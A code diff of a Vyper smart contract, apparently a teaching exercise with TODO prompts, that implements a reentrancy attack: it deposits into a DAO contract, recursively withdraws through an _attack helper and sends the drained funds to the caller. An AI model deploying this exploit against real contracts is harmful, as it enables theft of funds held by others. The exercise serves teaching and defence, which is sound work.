@@ -27,22 +27,19 @@ def _attack() -> bool:
 @payable
 def attack(dao_address:address):
     self.dao_address = dao_address
-    self.owner_address = msg.sender
     deposit_amount: uint256 = msg.value
-    self.deposit = deposit_amount
-    self.counter = dao_address.balance / deposit_amount + 1
  
     # Attack cannot withdraw more than what exists in the DAO
     if dao_address.balance < msg.value:
         deposit_amount = dao_address.balance
-        self.counter = 1
     
-    # TODO: make the deposit into the DAO
-    DAO(dao_address).deposit(value=deposit_amount)
+    total_amount: uint256 = deposit_amount + dao_address.balance
+    # TODO: make the deposit into the DAO   
+    deposited: bool = DAO(dao_address).deposit(value=deposit_amount)
     # TODO: Start the reentrancy attack
-    DAO(dao_address).withdraw()
+    hasAttacked: bool = self._attack()
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
-    send(self.owner_address, self.balance)
+    send(msg.sender, total_amount)
     pass
 
 @external
